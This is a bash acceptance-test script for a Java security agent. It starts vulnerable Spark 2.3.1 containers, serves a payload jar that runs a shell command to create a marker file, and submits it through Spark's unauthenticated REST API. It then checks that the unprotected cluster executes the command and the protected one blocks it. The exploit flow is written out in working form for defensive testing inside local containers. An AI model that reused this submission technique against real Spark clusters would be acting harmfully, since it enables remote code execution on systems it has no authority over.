#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_SPARK_IMAGE:-vulhub/spark:2.3.1}"
jar_image="${OHMYRASP_VULHUB_SPARK_JAR_IMAGE:-python:3-alpine}"
baseline_prefix="${OHMYRASP_VULHUB_SPARK_BASELINE_PREFIX:-ohmyrasp-vulhub-spark-unacc-baseline}"
protected_prefix="${OHMYRASP_VULHUB_SPARK_PROTECTED_PREFIX:-ohmyrasp-vulhub-spark-unacc-protected}"
baseline_master_ui_port="${OHMYRASP_VULHUB_SPARK_BASELINE_MASTER_UI_PORT:-19114}"
baseline_rest_port="${OHMYRASP_VULHUB_SPARK_BASELINE_REST_PORT:-19115}"
baseline_worker_ui_port="${OHMYRASP_VULHUB_SPARK_BASELINE_WORKER_UI_PORT:-19117}"
protected_master_ui_port="${OHMYRASP_VULHUB_SPARK_PROTECTED_MASTER_UI_PORT:-19118}"
protected_rest_port="${OHMYRASP_VULHUB_SPARK_PROTECTED_REST_PORT:-19119}"
protected_worker_ui_port="${OHMYRASP_VULHUB_SPARK_PROTECTED_WORKER_UI_PORT:-19120}"
marker_path="${OHMYRASP_VULHUB_SPARK_MARKER_PATH:-/tmp/ohmyrasp-spark-success}"
payload_dir="${OHMYRASP_VULHUB_SPARK_PAYLOAD_DIR:-/tmp/ohmyrasp-spark-payload}"
baseline_dir="logs/vulhub-spark-unacc-java8-baseline"
protected_dir="logs/vulhub-spark-unacc-java8-protected"
protected_log="${protected_dir}/events.jsonl"

build_payload() {
  rm -rf "$payload_dir"
  mkdir -p "${payload_dir}/src" "${payload_dir}/classes"
  PAYLOAD_DIR="$payload_dir" python3 - <<'PY'
import os
from pathlib import Path
payload_dir = Path(os.environ["PAYLOAD_DIR"])
(payload_dir / "src" / "OhMyRaspSparkPayload.java").write_text(
    "public class OhMyRaspSparkPayload {\n"
    "  public static void main(String[] args) throws Exception {\n"
    "    String marker = args.length == 0 ? \"/tmp/ohmyrasp-spark-success\" : args[0];\n"
    "    Process process = new ProcessBuilder(\"/bin/sh\", \"-c\", \"touch \" + marker).start();\n"
    "    if (process.waitFor() != 0) {\n"
    "      throw new IllegalStateException(\"marker command failed\");\n"
    "    }\n"
    "    System.out.println(\"ohmyrasp-spark-payload:\" + marker);\n"
    "  }\n"
    "}\n",
    encoding="utf-8")
PY
  docker run --rm -v "${payload_dir}:/work" -w /work gradle:jdk25 \
    bash -lc 'javac --release 8 -d classes src/OhMyRaspSparkPayload.java && jar --create --file ohmyrasp-spark-payload.jar -C classes .'
}

copy_artifacts() {
  local prefix="$1"
  local dir="$2"
  for role in master worker jar; do
    local name="${prefix}-${role}"
    if docker inspect "$name" >/dev/null 2>&1; then
      docker logs "$name" > "${dir}/${role}.log" 2>&1 || true
    fi
  done
}

cleanup_prefix() {
  local prefix="$1"
  docker rm -f "${prefix}-master" "${prefix}-worker" "${prefix}-jar" >/dev/null 2>&1 || true
  docker network rm "${prefix}-net" >/dev/null 2>&1 || true
}

wait_for_http() {
  local name="$1"
  local url="$2"
  local dir="$3"
  local label="$4"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl -sS -o "${dir}/${label}-ready-${attempt}.html" -w "%{http_code}" "$url" 2>/dev/null || true)"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf '%s_ready_attempt=%s status=%s\n' "$label" "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Spark ${label} did not become ready at ${url}" >&2
  exit 1
}

submit_payload() {
  local dir="$1"
  local rest_port="$2"
  local master_ip="$3"
  local jar_host="$4"
  python3 - "$master_ip" "$jar_host" "$marker_path" <<'PY' > "${dir}/submit.json"
import json
import sys
master, jar_host, marker = sys.argv[1], sys.argv[2], sys.argv[3]
jar_url = f"http://{jar_host}:8000/ohmyrasp-spark-payload.jar"
payload = {
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": [marker],
  "appResource": jar_url,
  "environmentVariables": {"SPARK_ENV_LOADED": "1"},
  "mainClass": "OhMyRaspSparkPayload",
  "sparkProperties": {
    "spark.jars": jar_url,
    "spark.driver.supervise": "false",
    "spark.app.name": "OhMyRaspSparkPayload",
    "spark.eventLog.enabled": "false",
    "spark.submit.deployMode": "cluster",
    "spark.master": f"spark://{master}:7077"
  }
}
print(json.dumps(payload))
PY
  curl -sS -o "${dir}/submit.response" -w "%{http_code}" \
    -H "Content-Type: application/json" --data-binary "@${dir}/submit.json" \
    "http://127.0.0.1:${rest_port}/v1/submissions/create" || true
}

start_cluster() {
  local prefix="$1"
  local master_ui_port="$2"
  local rest_port="$3"
  local worker_ui_port="$4"
  local dir="$5"
  local protected="$6"
  local agent_opts="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true"

  cleanup_prefix "$prefix"
  docker network create "${prefix}-net" >/dev/null
  docker run -d --name "${prefix}-jar" --network "${prefix}-net" \
    -v "${payload_dir}:/srv:ro" -w /srv "$jar_image" python3 -m http.server 8000 >/dev/null
  if [[ "$protected" == "true" ]]; then
    docker run -d --name "${prefix}-master" --network "${prefix}-net" \
      -p "${master_ui_port}:8080" -p "${rest_port}:6066" \
      -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
      -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
      -e "SPARK_MASTER_OPTS=${agent_opts}" \
      "$image" >/dev/null
  else
    docker run -d --name "${prefix}-master" --network "${prefix}-net" \
      -p "${master_ui_port}:8080" -p "${rest_port}:6066" \
      "$image" >/dev/null
  fi
  local master_ip
  master_ip="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "${prefix}-master")"
  printf 'master_ip=%s\n' "$master_ip" >> "${dir}/attempts.log"
  docker run -d --name "${prefix}-worker" --network "${prefix}-net" \
    -p "${worker_ui_port}:8081" \
    "$image" slave "spark://${master_ip}:7077" >/dev/null
  wait_for_http "${prefix}-master" "http://127.0.0.1:${master_ui_port}/" "$dir" "master"
  wait_for_http "${prefix}-worker" "http://127.0.0.1:${worker_ui_port}/" "$dir" "worker"
  echo "$master_ip"
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java8 agent startup event for Spark master" >&2
  exit 1
}

run_baseline() {
  local master_ip
  local status
  master_ip="$(start_cluster "$baseline_prefix" "$baseline_master_ui_port" "$baseline_rest_port" "$baseline_worker_ui_port" "$baseline_dir" false)"
  docker exec "${baseline_prefix}-worker" rm -f "$marker_path" || true
  status="$(submit_payload "$baseline_dir" "$baseline_rest_port" "$master_ip" "${baseline_prefix}-jar")"
  printf 'submit_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  for attempt in $(seq 1 120); do
    printf 'marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
    if docker exec "${baseline_prefix}-worker" test -f "$marker_path"; then
      copy_artifacts "$baseline_prefix" "$baseline_dir"
      cleanup_prefix "$baseline_prefix"
      return
    fi
    sleep 1
  done
  cat "${baseline_dir}/submit.response" >&2 || true
  copy_artifacts "$baseline_prefix" "$baseline_dir"
  tail -n 160 "${baseline_dir}/master.log" >&2 || true
  tail -n 160 "${baseline_dir}/worker.log" >&2 || true
  echo "baseline Spark did not execute the submitted application marker command" >&2
  exit 1
}

run_protected() {
  local master_ip
  local status
  master_ip="$(start_cluster "$protected_prefix" "$protected_master_ui_port" "$protected_rest_port" "$protected_worker_ui_port" "$protected_dir" true)"
  wait_for_protected_startup
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Spark protected master produced a detection before exploit traffic" >&2
    exit 1
  fi
  docker exec "${protected_prefix}-worker" rm -f "$marker_path" || true
  status="$(submit_payload "$protected_dir" "$protected_rest_port" "$master_ip" "${protected_prefix}-jar")"
  printf 'submit_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  for attempt in $(seq 1 30); do
    printf 'protected_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
    if docker exec "${protected_prefix}-worker" test -f "$marker_path"; then
      cat "$protected_log" >&2 || true
      echo "protected Spark still executed the submitted application marker command" >&2
      exit 1
    fi
    if grep -Eq '"algorithm":"java8_request_remote_job_submission".*"action":"block"' "$protected_log"; then
      copy_artifacts "$protected_prefix" "$protected_dir"
      cleanup_prefix "$protected_prefix"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  cat "${protected_dir}/submit.response" >&2 || true
  echo "missing java8_request_remote_job_submission block event for Spark REST submission" >&2
  exit 1
}

build_payload
rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
chmod 777 "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
cleanup_prefix "$baseline_prefix"
cleanup_prefix "$protected_prefix"
trap 'copy_artifacts "$baseline_prefix" "$baseline_dir"; copy_artifacts "$protected_prefix" "$protected_dir"; cleanup_prefix "$baseline_prefix"; cleanup_prefix "$protected_prefix"' EXIT

run_baseline
run_protected

echo "vulhub Spark unauthenticated REST submission Java8 acceptance passed"
